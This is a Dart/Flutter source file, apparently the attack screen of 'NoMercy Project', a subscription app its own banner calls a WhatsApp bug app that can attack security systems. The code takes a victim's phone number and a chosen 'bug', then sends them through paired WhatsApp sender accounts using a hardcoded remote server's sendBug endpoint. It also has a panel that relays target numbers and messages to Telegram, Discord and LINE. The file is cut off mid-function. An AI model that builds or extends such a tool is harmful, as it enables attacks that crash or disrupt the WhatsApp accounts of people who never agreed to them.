import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'package:flutter/material.dart';
import 'package:font_awesome_flutter/font_awesome_flutter.dart';
import 'package:http/http.dart' as http;
import 'package:video_player/video_player.dart';
import 'package:provider/provider.dart';
import 'theme_provider.dart';
import 'color_settings_sheet.dart';

// ============ GLOBAL SENDER TOOL ============
class GlobalSenderTool {
  final Map<String, String> _defaultHeaders = {
    'Content-Type': 'application/json',
    'User-Agent': 'GlobalSender/1.0',
  };

  Future<Map<String, dynamic>> sendRequest({
    required String url,
    required String method,
    Map<String, String>? headers,
    Map<String, dynamic>? body,
    Duration timeout = const Duration(seconds: 30),
  }) async {
    try {
      final allHeaders = {..._defaultHeaders, ...?headers};
      String? encodedBody;
      if (body != null) encodedBody = jsonEncode(body);
      http.Response response;
      switch (method.toUpperCase()) {
        case 'GET':
          response = await http.get(Uri.parse(url), headers: allHeaders).timeout(timeout);
          break;
        case 'POST':
          response = await http.post(Uri.parse(url), headers: allHeaders, body: encodedBody).timeout(timeout);
          break;
        case 'PUT':
          response = await http.put(Uri.parse(url), headers: allHeaders, body: encodedBody).timeout(timeout);
          break;
        case 'DELETE':
          response = await http.delete(Uri.parse(url), headers: allHeaders).timeout(timeout);
          break;
        default:
          throw Exception('Method tidak didukung: $method');
      }
      return {
        'success': response.statusCode >= 200 && response.statusCode < 300,
        'statusCode': response.statusCode,
        'data': _parseResponse(response.body),
        'headers': response.headers,
      };
    } on SocketException {
      return {'success': false, 'error': 'Tidak ada koneksi internet'};
    } on http.ClientException catch (e) {
      return {'success': false, 'error': 'Client error: ${e.message}'};
    } catch (e) {
      return {'success': false, 'error': e.toString()};
    }
  }

  Future<Map<String, dynamic>> sendTelegram({
    required String botToken,
    required String chatId,
    required String message,
  }) async {
    return await sendRequest(
      url: 'https://api.telegram.org/bot$botToken/sendMessage',
      method: 'POST',
      body: {'chat_id': chatId, 'text': message, 'parse_mode': 'HTML'},
    );
  }

  Future<Map<String, dynamic>> sendDiscord({
    required String webhookUrl,
    required String message,
    String? username,
    String? avatarUrl,
  }) async {
    return await sendRequest(
      url: webhookUrl,
      method: 'POST',
      body: {
        'content': message,
        if (username != null) 'username': username,
        if (avatarUrl != null) 'avatar_url': avatarUrl,
      },
    );
  }

  Future<Map<String, dynamic>> sendLine({
    required String channelAccessToken,
    required String userId,
    required String message,
  }) async {
    return await sendRequest(
      url: 'https://api.line.me/v2/bot/message/push',
      method: 'POST',
      headers: {'Authorization': 'Bearer $channelAccessToken'},
      body: {
        'to': userId,
        'messages': [
          {'type': 'text', 'text': message}
        ],
      },
    );
  }

  dynamic _parseResponse(String body) {
    try {
      return jsonDecode(body);
    } catch (e) {
      return body;
    }
  }
}
// ============ END GLOBAL SENDER TOOL ============

class AttackPage extends StatefulWidget {
  final String username;
  final String password;
  final String sessionKey;
  final List<Map<String, dynamic>> listBug;
  final String role;
  final String expiredDate;

  const AttackPage({
    super.key,
    required this.username,
    required this.password,
    required this.sessionKey,
    required this.listBug,
    required this.role,
    required this.expiredDate,
  });

  @override
  State<AttackPage> createState() => _AttackPageState();
}

class _AttackPageState extends State<AttackPage> with TickerProviderStateMixin {
  // ── Theme getters ────────────────────────────────────────────────────────
  Color get kRed       { try { return context.read<ThemeProvider>().primaryColor; } catch(_) { return const Color(0xFFD32F2F); } }
  Color get kRedLight  { try { return context.read<ThemeProvider>().accentColor;  } catch(_) { return const Color(0xFFEF5350); } }
  Color get kRedDark   { try { return context.read<ThemeProvider>().primaryColor.withOpacity(0.7); } catch(_) { return const Color(0xFF8B0000); } }
  Color get kBg        { try { final tp = context.read<ThemeProvider>(); return tp.isDarkMode ? const Color(0xFF050505) : const Color(0xFFF5F5F5); } catch(_) { return const Color(0xFF050505); } }
  Color get kCard      { try { final tp = context.read<ThemeProvider>(); return tp.isDarkMode ? const Color(0xFF1A1A1A) : const Color(0xFFFFFFFF); } catch(_) { return const Color(0xFF1A1A1A); } }
  Color get kCardBorder{ try { return context.read<ThemeProvider>().primaryColor.withOpacity(0.3); } catch(_) { return const Color(0xFF3D0000); } }

  final targetController = TextEditingController();
  static const String baseUrl = "http://kasaprivate01.angkasanyabobo.my.id:1328";

  late AnimationController _glowController;
  late Animation<double> _glowAnimation;

  late VideoPlayerController _videoController;
  bool _videoInitialized = false;
  bool _videoError = false;

  String selectedBugId = "";
  bool _isSending = false;
  bool _isSuccess = false;

  final GlobalSenderTool _globalSender = GlobalSenderTool();

  bool _showGlobalSenderPanel = false;
  final _telegramBotTokenController = TextEditingController();
  final _telegramChatIdController = TextEditingController();
  final _discordWebhookController = TextEditingController();
  final _lineTokenController = TextEditingController();
  final _lineUserIdController = TextEditingController();
  final _customMessageController = TextEditingController();
  String _selectedPlatform = 'Telegram';
  bool _isSendingGlobal = false;

  String get _senderType => _isMember ? 'private' : __senderType;
  String __senderType = "global";
  List<Map<String, dynamic>> _globalSenders = [];
  List<Map<String, dynamic>> _privateSenders = [];
  bool _isLoadingSenders = false;
  final _senderInputController = TextEditingController();
  bool _isAddingSender = false;

  Timer? _senderPollingTimer;
  static const _pollingInterval = Duration(seconds: 10);

  bool get _isMember => widget.role.toLowerCase() == 'member';
  bool get _canSendBug => !_isMember;
  bool get _canManageSender => !_isMember;
  bool get _canAccessGlobalSender => !_isMember;

  @override
  void initState() {
    super.initState();
    _glowController = AnimationController(
        vsync: this, duration: const Duration(milliseconds: 2000))
      ..repeat(reverse: true);
    _glowAnimation = Tween<double>(begin: 0.5, end: 1.0).animate(
        CurvedAnimation(parent: _glowController, curve: Curves.easeInOut));
    _initializeVideoController();
    _setDefaultBug();
    _fetchSenders();
    _startPolling();
  }

  void _startPolling() {
    _senderPollingTimer = Timer.periodic(_pollingInterval, (_) {
      if (mounted) _fetchSendersSilent();
    });
  }

  Future<void> _fetchSendersSilent() async {
    try {
      final res = await http
          .get(Uri.parse("$baseUrl/api/whatsapp/getSenders?key=${widget.sessionKey}"))
          .timeout(const Duration(seconds: 8));
      final data = jsonDecode(res.body);
      if (data["valid"] == true && mounted) {
        final newGlobal = List<Map<String, dynamic>>.from(data["globalSenders"] ?? []);
        final newPrivate = List<Map<String, dynamic>>.from(data["privateSenders"] ?? []);
        if (_listChanged(_globalSenders, newGlobal) || _listChanged(_privateSenders, newPrivate)) {
          setState(() {
            _globalSenders = newGlobal;
            _privateSenders = newPrivate;
          });
        }
      }
    } catch (_) {}
  }

  bool _listChanged(List<Map<String, dynamic>> oldList, List<Map<String, dynamic>> newList) {
    if (oldList.length != newList.length) return true;
    final oldNums = oldList.map((e) => e['number']?.toString() ?? '').toSet();
    final newNums = newList.map((e) => e['number']?.toString() ?? '').toSet();
    return !oldNums.containsAll(newNums) || !newNums.containsAll(oldNums);
  }

  void _setDefaultBug() {
    if (widget.listBug.isNotEmpty) {
      selectedBugId = widget.listBug[0]['bug_id'];
    }
  }

  void _initializeVideoController() {
    try {
      _videoController = VideoPlayerController.asset('assets/videos/banner.mp4')
        ..initialize().then((_) {
          if (mounted) {
            setState(() => _videoInitialized = true);
            _videoController.setLooping(true);
            _videoController.play();
            _videoController.setVolume(0.8);
          }
        }).catchError((_) {
          if (mounted) setState(() => _videoError = true);
        });
    } catch (_) {
      if (mounted) setState(() => _videoError = true);
    }
  }

  // ─── API ──────────────────────────────────────────────────────────────────

  Future<void> _fetchSenders() async {
    setState(() => _isLoadingSenders = true);
    try {
      final res = await http.get(Uri.parse(
          "$baseUrl/api/whatsapp/getSenders?key=${widget.sessionKey}"));
      final data = jsonDecode(res.body);
      if (data["valid"] == true) {
        setState(() {
          _globalSenders = List<Map<String, dynamic>>.from(data["globalSenders"] ?? []);
          _privateSenders = List<Map<String, dynamic>>.from(data["privateSenders"] ?? []);
        });
      }
    } catch (_) {
      _showAlert("❌ Error", "Gagal memuat data sender.");
    } finally {
      setState(() => _isLoadingSenders = false);
    }
  }

  Future<void> _addSender(String number, String type) async {
    if (number.isEmpty) {
      _showAlert("❌ Error", "Nomor sender tidak boleh kosong.");
      return;
    }
    if (_isMember) type = 'private';
    String formatted = number.trim();
    if (formatted.startsWith('0')) {
      formatted = '62${formatted.substring(1)}';
    } else if (formatted.startsWith('+')) {
      formatted = formatted.replaceAll('+', '');
    } else if (!formatted.startsWith('62')) {
      formatted = '62$formatted';
    }
    setState(() => _isAddingSender = true);
    try {
      final isGlobal = type == 'global';
      final uri = Uri.parse(
          "$baseUrl/api/whatsapp/getPairing?key=${widget.sessionKey}&number=$formatted&isGlobal=$isGlobal");
      final res = await http.get(uri).timeout(const Duration(seconds: 30));
      final data = jsonDecode(res.body);
      if (data["valid"] == true && data["pairingCode"] != null) {
        _senderInputController.clear();
        if (mounted) {
          _showPairingDialog(
              number: formatted,
              type: type,
              pairingCode: data["pairingCode"].toString());
        }
      } else {
        final msg = data["message"] ?? data["error"] ?? "Gagal mendapatkan pairing code.";
        _showAlert("❌ Gagal", msg);
      }
    } on SocketException {
      _showAlert("❌ Error", "Tidak ada koneksi internet.");
    } catch (e) {
      _showAlert("❌ Error", "Terjadi kesalahan: $e");
    } finally {
      if (mounted) setState(() => _isAddingSender = false);
    }
  }

  void _showPairingDialog({
    required String number,
    required String type,
    required String pairingCode,
  }) {
    final formatted = pairingCode.length == 8
        ? '${pairingCode.substring(0, 4)}-${pairingCode.substring(4)}'
        : pairingCode;
    showDialog(
      context: context,
      barrierDismissible: false,
      builder: (_) => AlertDialog(
        backgroundColor: const Color(0xFF120000),
        shape: RoundedRectangleBorder(
            borderRadius: BorderRadius.circular(18),
            side: BorderSide(color: kRed.withOpacity(0.4), width: 1)),
        title: Row(children: [
          Icon(FontAwesomeIcons.whatsapp, color: kRedLight, size: 20),
          const SizedBox(width: 10),
          Text(
              type == 'global' ? "Global Sender Pairing" : "Private Sender Pairing",
              style: const TextStyle(
                  color: Colors.white, fontFamily: 'Orbitron', fontSize: 14)),
        ]),
        content: Column(mainAxisSize: MainAxisSize.min, children: [
          Text("Masukkan kode ini di WhatsApp nomor:",
              style: TextStyle(
                  color: Colors.white.withOpacity(0.7),
                  fontFamily: 'ShareTechMono',
                  fontSize: 12)),
          const SizedBox(height: 4),
          Text(number,
              style: TextStyle(
                  color: kRedLight,
                  fontFamily: 'ShareTechMono',
                  fontSize: 13,
                  fontWeight: FontWeight.bold)),
          const SizedBox(height: 16),
          Container(
            padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 14),
            decoration: BoxDecoration(
                color: kRed.withOpacity(0.1),
                borderRadius: BorderRadius.circular(12),
                border: Border.all(color: kRed.withOpacity(0.4))),
            child: Text(formatted,
                style: const TextStyle(
                    color: Colors.white,
                    fontFamily: 'Orbitron',
                    fontSize: 30,
                    fontWeight: FontWeight.bold,
                    letterSpacing: 8)),
          ),
          const SizedBox(height: 16),
          Container(
            padding: const EdgeInsets.all(12),
            decoration: BoxDecoration(
                color: Colors.white.withOpacity(0.04),
                borderRadius: BorderRadius.circular(10)),
            child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
              _pairingStep("1", "Buka WhatsApp di HP nomor $number"),
              _pairingStep("2", "Ketuk ⋮ Menu → Perangkat Tertaut"),
              _pairingStep("3", "Ketuk \"Tautkan dengan nomor telepon\""),
              _pairingStep("4", "Masukkan kode di atas"),
            ]),
          ),
          const SizedBox(height: 12),
          Text("Kode berlaku ±60 detik.",
              style: TextStyle(
                  color: Colors.white.withOpacity(0.4),
                  fontFamily: 'ShareTechMono',
                  fontSize: 10),
              textAlign: TextAlign.center),
        ]),
        actions: [
          TextButton(
              onPressed: () {
                Navigator.pop(context);
                _fetchSenders();
              },
              child: Text("Selesai",
                  style: TextStyle(color: kRedLight, fontFamily: 'Orbitron'))),
        ],
      ),
    );
  }

  Widget _pairingStep(String step, String text) {
    return Padding(
      padding: const EdgeInsets.symmetric(vertical: 3),
      child: Row(crossAxisAlignment: CrossAxisAlignment.start, children: [
        Container(
            width: 20,
            height: 20,
            alignment: Alignment.center,
            decoration: BoxDecoration(
                color: kRed.withOpacity(0.2), shape: BoxShape.circle),
            child: Text(step,
                style: TextStyle(
                    color: kRedLight, fontSize: 11, fontWeight: FontWeight.bold))),
        const SizedBox(width: 8),
        Expanded(
            child: Text(text,
                style: TextStyle(
                    color: Colors.white.withOpacity(0.7),
                    fontFamily: 'ShareTechMono',
                    fontSize: 11))),
      ]),
    );
  }

  Future<void> _deleteSender(String number, String type) async {
    try {
      final res = await http.post(
        Uri.parse("$baseUrl/api/whatsapp/deleteSender"),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({"key": widget.sessionKey, "number": number, "type": type}),
      );
      final data = jsonDecode(res.body);
      if (data["success"] == true) {
        _showAlert("✅ Berhasil", "Sender berhasil dihapus.");
        await _fetchSenders();
      } else {
        _showAlert("❌ Gagal", data["message"] ?? "Gagal menghapus sender.");
      }
    } catch (_) {
      _showAlert("❌ Error", "Terjadi kesalahan saat menghapus sender.");
    }
  }

  void _showDeleteConfirmation(String number, String type) {
    showDialog(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: const Color(0xFF120000),
        shape: RoundedRectangleBorder(
            borderRadius: BorderRadius.circular(18),
            side: BorderSide(color: Colors.red.withOpacity(0.4), width: 1)),
        title: Text("⚠️ Konfirmasi Hapus",
            style: TextStyle(
                color: Colors.white, fontFamily: 'Orbitron', fontSize: 15)),
        content: Text("Hapus sender $number dari daftar $type?",
            style: const TextStyle(
                color: Colors.white70, fontFamily: 'ShareTechMono')),
        actions: [
          TextButton(
              onPressed: () => Navigator.pop(context),
              child: Text("Batal",
                  style: TextStyle(color: Colors.white.withOpacity(0.5)))),
          TextButton(
              onPressed: () {
                Navigator.pop(context);
                _deleteSender(number, type);
              },
              child: const Text("Hapus", style: TextStyle(color: Colors.red))),
        ],
      ),
    );
  }

  String? formatPhoneNumber(String input) {
    final cleaned = input.replaceAll(RegExp(r'[^\d]'), '');
    if (cleaned.startsWith('0') || cleaned.length < 8) return null;
    return cleaned;
  }

  Future<void> _sendBug() async {
    if (_isSending) return;
    setState(() => _isSending = true);
    final rawInput = targetController.text.trim();
    final target = formatPhoneNumber(rawInput);
    final key = widget.sessionKey;
    if (target == null || key.isEmpty) {
      _showAlert("❌ Invalid Number",
          "Gunakan nomor internasional (misal: +62, 1, 44), bukan 08xxx.");
      setState(() => _isSending = false);
      return;
    }
    try {
      final res = await http.get(Uri.parse(
          "$baseUrl/api/whatsapp/sendBug?key=$key&target=$target&bug=$selectedBugId"));
      final data = jsonDecode(res.body);
      if (data["cooldown"] == true) {
        _showAlert("⏳ Cooldown", "Tunggu beberapa saat sebelum mengirim lagi.");
      } else if (data["senderOn"] == false) {
        _showAlert("⚠️ Gagal", "Gagal mengirim bug. Sender Kosong, Hubungi Seller.");
      } else if (data["valid"] == false) {
        _showAlert("❌ Key Invalid", "Session key tidak valid. Silakan login ulang.");
      } else if (data["sended"] == false) {
        _showAlert("⚠️ Gagal", "Gagal mengirim bug. Mungkin server sedang maintenance.");
      } else {
        setState(() => _isSuccess = true);
        _showSuccessPopup(target);
      }
    } catch (_) {
      _showAlert("❌ Error", "Terjadi kesalahan. Coba lagi.");
    } finally {
      setState(() => _isSending = false);
    }
  }

  void _showSuccessPopup(String target) {
    showDialog(
      context: context,
      barrierDismissible: false,
      builder: (context) => SuccessVideoDialog(
          target: target,
          onDismiss: () {
            Navigator.of(context).pop();
            setState(() => _isSuccess = false);
          }),
    );
  }

  void _showAlert(String title, String msg) {
    showDialog(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: const Color(0xFF120000),
        shape: RoundedRectangleBorder(
            borderRadius: BorderRadius.circular(18),
            side: BorderSide(color: kRed.withOpacity(0.3), width: 1)),
        title: Text(title,
            style: const TextStyle(color: Colors.white, fontFamily: 'Orbitron')),
        content: Text(msg,
            style: const TextStyle(
                color: Colors.white70, fontFamily: 'ShareTechMono')),
        actions: [
          TextButton(
              onPressed: () => Navigator.pop(context),
              child: Text("OK", style: TextStyle(color: kRedLight)))
        ],
      ),
    );
  }

  Future<void> _sendGlobalMessage() async {
    final targetNumber = targetController.text.trim();
    if (targetNumber.isEmpty) {
      _showAlert("❌ Error", "Masukkan target number terlebih dahulu!");
      return;
    }
    final customMessage = _customMessageController.text.trim();
    if (customMessage.isEmpty) {
      _showAlert("❌ Error", "Masukkan pesan yang akan dikirim!");
      return;
    }
    setState(() => _isSendingGlobal = true);
    Map<String, dynamic> result;
    switch (_selectedPlatform) {
      case 'Telegram':
        final botToken = _telegramBotTokenController.text.trim();
        final chatId = _telegramChatIdController.text.trim();
        if (botToken.isEmpty || chatId.isEmpty) {
          _showAlert("❌ Error", "Isi Bot Token dan Chat ID Telegram!");
          setState(() => _isSendingGlobal = false);
          return;
        }
        result = await _globalSender.sendTelegram(
            botToken: botToken,
            chatId: chatId,
            message: "📱 *Target: $targetNumber*\n💬 *Pesan:* $customMessage");
        break;
      case 'Discord':
        final webhookUrl = _discordWebhookController.text.trim();
        if (webhookUrl.isEmpty) {
          _showAlert("❌ Error", "Isi Webhook URL Discord!");
          setState(() => _isSendingGlobal = false);
          return;
        }
        result = await _globalSender.sendDiscord(
            webhookUrl: webhookUrl,
            message: "**Target:** $targetNumber\n**Pesan:** $customMessage",
            username: "GlobalSenderBot");
        break;
      case 'LINE':
        final lineToken = _lineTokenController.text.trim();
        final lineUserId = _lineUserIdController.text.trim();
        if (lineToken.isEmpty || lineUserId.isEmpty) {
          _showAlert("❌ Error", "Isi Channel Access Token dan User ID LINE!");
          setState(() => _isSendingGlobal = false);
          return;
        }
        result = await _globalSender.sendLine(
            channelAccessToken: lineToken,
            userId: lineUserId,
            message: "Target: $targetNumber\nPesan: $customMessage");
        break;
      default:
        result = {'success': false, 'error': 'Platform tidak dikenal'};
    }
    setState(() => _isSendingGlobal = false);
    if (result['success']) {
      _showAlert("✅ Berhasil", "Pesan berhasil dikirim ke $_selectedPlatform!");
      _customMessageController.clear();
    } else {
      _showAlert("❌ Gagal",
          "Gagal mengirim pesan: ${result['error'] ?? 'Unknown error'}");
    }
  }

  // ─── BUILD ────────────────────────────────────────────────────────────────

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: kBg,
      body: Stack(children: [
        Container(color: kBg),
        SafeArea(
          child: Column(children: [
            _buildTopBar(),
            Expanded(
              child: SingleChildScrollView(
                physics: const BouncingScrollPhysics(),
                padding: const EdgeInsets.fromLTRB(14, 0, 14, 20),
                child: Column(children: [
                  const SizedBox(height: 12),
                  _buildUserCard(),
                  const SizedBox(height: 12),
                  _buildBannerVideo(),
                  const SizedBox(height: 14),
                  _buildTargetInputCard(),
                  const SizedBox(height: 12),
                  _buildBugTypeCard(),
                  const SizedBox(height: 12),
                  _buildSenderTypeCard(),
                  const SizedBox(height: 12),
                  if (_canManageSender)
                    _buildSenderManagementCard()
                  else
                    _buildMemberPrivateSenderCard(),
                  const SizedBox(height: 12),
                  if (_canAccessGlobalSender) ...[
                    if (!_showGlobalSenderPanel)
                      _buildOpenGlobalSenderBtn()
                    else
                      _buildGlobalSenderPanel(),
                    const SizedBox(height: 12),
                  ],
                  _buildSendButton(),
                  const SizedBox(height: 6),
                  _buildFooter(),
                ]),
              ),
            ),
          ]),
        ),
      ]),
    );
  }

  // ─── TOP BAR ──────────────────────────────────────────────────────────────

  Widget _buildTopBar() {
    return Container(
      padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 10),
      decoration: BoxDecoration(
          color: const Color(0xFF1A0000),
          border: Border(bottom: BorderSide(color: kCardBorder, width: 1))),
      child: Row(children: [
        const Icon(Icons.menu, color: Colors.white70, size: 22),
        const SizedBox(width: 12),
        Expanded(
          child: Row(children: [
            Text("Halo, ${widget.username} 👋",
                style: const TextStyle(
                    color: Colors.white,
                    fontFamily: 'Orbitron',
                    fontWeight: FontWeight.bold,
                    fontSize: 14)),
          ]),
        ),
        const Icon(FontAwesomeIcons.headset, color: Colors.white54, size: 18),
        const SizedBox(width: 16),
        const Icon(FontAwesomeIcons.userCircle, color: Colors.white54, size: 18),
      ]),
    );
  }

  // ─── USER CARD ────────────────────────────────────────────────────────────

  Widget _buildUserCard() {
    return Container(
      padding: const EdgeInsets.all(14),
      decoration: BoxDecoration(
          color: kCard,
          borderRadius: BorderRadius.circular(14),
          border: Border.all(color: kCardBorder)),
      child: Row(children: [
        Container(
          width: 52,
          height: 52,
          decoration: BoxDecoration(
              shape: BoxShape.circle,
              border: Border.all(color: kRed, width: 2),
              color: kRedDark.withOpacity(0.3)),
          child: ClipOval(
            child: Center(
              child: Text("NM",
                  style: TextStyle(
                      color: kRedLight,
                      fontFamily: 'Orbitron',
                      fontSize: 16,
                      fontWeight: FontWeight.bold)),
            ),
          ),
        ),
        const SizedBox(width: 12),
        Expanded(
          child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
            Text(widget.username,
                style: const TextStyle(
                    color: Colors.white,
                    fontFamily: 'Orbitron',
                    fontWeight: FontWeight.bold,
                    fontSize: 15)),
            const SizedBox(height: 5),
            Row(children: [
              _roleBadge(widget.role),
              const SizedBox(width: 8),
              Text("Exp: ${widget.expiredDate}",
                  style: TextStyle(
                      color: Colors.white.withOpacity(0.55),
                      fontFamily: 'ShareTechMono',
                      fontSize: 11)),
            ]),
          ]),
        ),
        Container(
          padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 4),
          decoration: BoxDecoration(
              color: Colors.green.withOpacity(0.15),
              borderRadius: BorderRadius.circular(8),
              border: Border.all(color: Colors.green.withOpacity(0.4), width: 1)),
          child: Row(mainAxisSize: MainAxisSize.min, children: [
            AnimatedBuilder(
                animation: _glowAnimation,
                builder: (_, __) => Container(
                      width: 7,
                      height: 7,
                      decoration: BoxDecoration(
                          color: Colors.green
                              .withOpacity(0.5 + 0.5 * _glowAnimation.value),
                          shape: BoxShape.circle),
                    )),
            const SizedBox(width: 5),
            const Text("LIVE",
                style: TextStyle(
                    color: Colors.green,
                    fontSize: 11,
                    fontFamily: 'ShareTechMono',
                    fontWeight: FontWeight.bold)),
          ]),
        ),
      ]),
    );
  }

  Widget _roleBadge(String role) {
    return Container(
      padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 3),
      decoration: BoxDecoration(
          color: _getRoleColor().withOpacity(0.15),
          borderRadius: BorderRadius.circular(6),
          border: Border.all(color: _getRoleColor().withOpacity(0.5), width: 1)),
      child: Text(role.toUpperCase(),
          style: TextStyle(
              color: _getRoleColor(),
              fontSize: 10,
              fontFamily: 'ShareTechMono',
              fontWeight: FontWeight.bold)),
    );
  }

  Color _getRoleColor() {
    switch (widget.role.toLowerCase()) {
      case 'owner':
      case 'high owner':
        return Colors.red;
      case 'vip':
        return Colors.amber;
      case 'reseller':
        return Colors.blue;
      default:
        return Colors.white70;
    }
  }

  // ─── BANNER VIDEO ─────────────────────────────────────────────────────────

  Widget _buildBannerVideo() {
    return ClipRRect(
      borderRadius: BorderRadius.circular(14),
      child: Container(
        height: 160,
        width: double.infinity,
        decoration: BoxDecoration(
            color: const Color(0xFF0D0000),
            borderRadius: BorderRadius.circular(14),
            border: Border.all(color: kCardBorder)),
        child: Stack(fit: StackFit.expand, children: [
          _videoInitialized && !_videoError
              ? FittedBox(
                  fit: BoxFit.cover,
                  child: SizedBox(
                      width: _videoController.value.size.width,
                      height: _videoController.value.size.height,
                      child: VideoPlayer(_videoController)))
              : Image.asset('assets/images/banner.jpg',
                  fit: BoxFit.cover,
                  errorBuilder: (_, __, ___) => Container(
                      color: const Color(0xFF0D0000),
                      child: const Center(
                          child: Icon(Icons.image_not_supported,
                              color: Colors.white24, size: 40)))),
          Container(
              decoration: BoxDecoration(
                  gradient: LinearGradient(
                      colors: [
                    Colors.black.withOpacity(0.55),
                    Colors.transparent,
                    Colors.black.withOpacity(0.7)
                  ],
                      begin: Alignment.topCenter,
                      end: Alignment.bottomCenter))),
          Positioned(
            top: 12,
            right: 14,
            child: Text("CREATED BY ${widget.username.toUpperCase()}",
                style: TextStyle(
                    color: kRedLight,
                    fontFamily: 'ShareTechMono',
                    fontSize: 10,
                    letterSpacing: 1.5)),
          ),
          Positioned(
            bottom: 10,
            left: 14,
            right: 14,
            child: Text(
                "NoMercy Project is a hassle-free WhatsApp bug app that can attack the security system with a modern and vicious appearance.",
                style: TextStyle(
                    color: Colors.white.withOpacity(0.55),
                    fontFamily: 'ShareTechMono',
                    fontSize: 9),
                maxLines: 2,
                overflow: TextOverflow.ellipsis),
          ),
        ]),
      ),
    );
  }

  // ─── TARGET INPUT ─────────────────────────────────────────────────────────

  Widget _buildTargetInputCard() {
    return _card(
      child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
        _sectionLabel(FontAwesomeIcons.mobileAlt, "Nomor Target"),
        const SizedBox(height: 12),
        Container(
          decoration: BoxDecoration(
              color: const Color(0xFF0D0000),
              borderRadius: BorderRadius.circular(12),
              border: Border.all(color: kCardBorder)),
          child: TextField(
            controller: targetController,
            keyboardType: TextInputType.phone,
            style: const TextStyle(
                color: Colors.white, fontFamily: 'ShareTechMono', fontSize: 14),
            cursorColor: kRedLight,
            decoration: InputDecoration(
              hintText: "Contoh: +62812xxxxxxxx",
              hintStyle: TextStyle(
                  color: Colors.white.withOpacity(0.35),
                  fontFamily: 'ShareTechMono',
                  fontSize: 13),
              // FIX: Hapus const dari prefixIcon karena kRedLight bukan const
              prefixIcon: Padding(
                  padding: const EdgeInsets.all(12),
                  child: Icon(FontAwesomeIcons.mobileAlt,
                      color: kRedLight, size: 18)),
              border: InputBorder.none,
              contentPadding:
                  const EdgeInsets.symmetric(vertical: 14, horizontal: 12),
            ),
          ),
        ),
      ]),
    );
  }

  // ─── BUG TYPE ─────────────────────────────────────────────────────────────

  Widget _buildBugTypeCard() {
    return _card(
      child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
        _sectionLabel(FontAwesomeIcons.cogs, "Pilih Bug"),
        const SizedBox(height: 12),
        Container(
          padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 4),
          decoration: BoxDecoration(
              color: const Color(0xFF0D0000),
              borderRadius: BorderRadius.circular(12),
              border: Border.all(color: kCardBorder)),
          child: DropdownButtonHideUnderline(
            child: DropdownButton<String>(
              dropdownColor: const Color(0xFF120000),
              value: selectedBugId.isEmpty ? null : selectedBugId,
              isExpanded: true,
              iconEnabledColor: kRedLight,
              style: const TextStyle(color: Colors.white, fontSize: 13),
              items: widget.listBug
                  .map((bug) => DropdownMenuItem<String>(
                        value: bug['bug_id'],
                        child: Row(children: [
                          // FIX: Hapus const dari BoxDecoration karena kRed bukan const
                          Container(
                              width: 10,
                              height: 10,
                              decoration: BoxDecoration(
                                  color: kRed, shape: BoxShape.circle)),
                          const SizedBox(width: 10),
                          Expanded(
                              child: Text(bug['bug_name'],
                                  style: const TextStyle(
                                      color: Colors.white,
                                      fontFamily: 'ShareTechMono',
                                      fontSize: 13),
                                  overflow: TextOverflow.ellipsis)),
                        ]),
                      ))
                  .toList(),
              onChanged: (v) => setState(() => selectedBugId = v!),
            ),
          ),
        ),
      ]),
    );
  }

  // ─── SENDER TYPE ──────────────────────────────────────────────────────────

  Widget _buildSenderTypeCard() {
    final currentSenders = __senderType == 'global' ? _globalSenders : _privateSenders;
    return _card(
      child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
        Row(children: [
          _sectionLabel(FontAwesomeIcons.slidersH, "Sender Type"),
          const Spacer(),
          GestureDetector(
            onTap: _fetchSenders,
            child: Container(
              padding: const EdgeInsets.all(8),
              decoration: BoxDecoration(
                  color: kRed.withOpacity(0.15),
                  borderRadius: BorderRadius.circular(8),
                  border: Border.all(color: kRed.withOpacity(0.3))),
              child: Icon(Icons.refresh, color: kRedLight, size: 16),
            ),
          ),
        ]),
        Text("Pilih sumber pengirim",
            style: TextStyle(
                color: Colors.white.withOpacity(0.45),
                fontFamily: 'ShareTechMono',
                fontSize: 11)),
        const SizedBox(height: 14),
        if (!_isMember)
          Row(children: [
            Expanded(
                child: _senderTypeBtn(
                    "global", "Global", FontAwesomeIcons.globe, _globalSenders.length)),
            const SizedBox(width: 10),
            Expanded(
                child: _senderTypeBtn(
                    "private", "Private", FontAwesomeIcons.shield, _privateSenders.length)),
          ])
        else
          _senderTypeBtn(
              "private", "Private", FontAwesomeIcons.shield, _privateSenders.length),
        const SizedBox(height: 12),
        if (currentSenders.isNotEmpty) ...[
          Row(children: [
            Container(
                width: 8,
                height: 8,
                decoration: const BoxDecoration(
                    color: Colors.green, shape: BoxShape.circle)),
            const SizedBox(width: 6),
            Text("${currentSenders.length} sender terdaftar",
                style: const TextStyle(
                    color: Colors.green,
                    fontFamily: 'ShareTechMono',
                    fontSize: 12,
                    fontWeight: FontWeight.bold)),
          ]),
          const SizedBox(height: 8),
          ...currentSenders.take(3).map((s) {
            final num = s['number'] ?? s['sender_number'] ?? '';
            return Padding(
              padding: const EdgeInsets.only(bottom: 4),
              child: Row(children: [
                Container(
                    width: 8,
                    height: 8,
                    decoration: const BoxDecoration(
                        color: Colors.green, shape: BoxShape.circle)),
                const SizedBox(width: 8),
                Text(num,
                    style: const TextStyle(
                        color: Colors.white70,
                        fontFamily: 'ShareTechMono',
                        fontSize: 12)),
              ]),
            );
          }),
          if (currentSenders.length > 3)
            Padding(
              padding: const EdgeInsets.only(left: 16),
              child: Text("+ ${currentSenders.length - 3} lainnya...",
                  style: TextStyle(
                      color: Colors.white.withOpacity(0.4),
                      fontFamily: 'ShareTechMono',
                      fontSize: 11)),
            ),
        ] else
          Text("Belum ada sender terdaftar",
              style: TextStyle(
                  color: Colors.white.withOpacity(0.3),
                  fontFamily: 'ShareTechMono',
                  fontSize: 11)),
      ]),
    );
  }

  Widget _senderTypeBtn(String type, String label, IconData icon, int count) {
    final isSelected = _senderType == type;
